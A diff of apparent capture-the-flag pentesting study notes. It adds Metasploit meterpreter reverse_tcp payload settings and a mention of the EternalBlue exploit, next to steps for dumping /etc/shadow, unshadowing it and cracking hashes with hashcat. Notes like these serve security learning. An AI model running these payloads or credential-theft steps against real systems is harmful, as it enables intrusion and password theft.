@@ -186,6 +186,13 @@ Response codes: `200` ok, `400` error, `500` server error, `300` is redirect
 - `show targets`
 - `run`
 
+- `set payload windows/x64/meterpreter` see if the options for the staged show up. The goal is to just try an alternative with staged approach if the non-staged approach does not work
+- `set payload windows/x64/meterpreter/reverse_tcp` - Note that this is at the exploit level and before you have established the connection
+
+- eternal blue was one of the exploites for the microsoft SMBA version that was exploited by **wannacry** It was developed by NSA. The exploit python code can be found at github (MS17-010-eternal blue)
+- 
+
+
 - Then once you have gained access, you can type `whoami` to see if you got root access, then you can explore further with:
     `ls`, `pwd`, `updatedb`, ` locate root.txt`, `locate user.txt`, `cat etc/passwd`, `cat etc/shadow`, `gedit passwd`, `gedit shadow` to copy the contents of your file into text files so you can **unshadow** them using `unshadow passwd shadow` these are the names of the files as you saved using gedit
 - What this does is replaces the 'x' in the passwd file with the hash and then you can crack the hashes using **hashcat**
